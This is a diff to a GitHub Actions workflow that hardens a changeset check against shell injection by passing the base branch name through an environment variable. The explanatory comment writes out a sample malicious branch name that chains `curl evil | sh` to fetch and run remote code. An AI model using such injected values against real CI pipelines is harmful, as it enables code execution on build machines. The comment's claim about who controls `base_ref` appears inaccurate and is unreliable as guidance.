@@ -65,4 +65,10 @@ jobs:
 
       - name: Require a changeset for published packages
         if: github.event_name == 'pull_request'
-        run: ./node_modules/.bin/changeset status --since=origin/${{ github.base_ref }}
+        # `base_ref` is a branch name, and on a fork pull request the author
+        # chooses it. Interpolated straight into `run:` it is shell input, so a
+        # branch called `x; curl evil | sh` would execute. Through `env:` it is
+        # only ever a string.
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: ./node_modules/.bin/changeset status --since="origin/$BASE_REF"
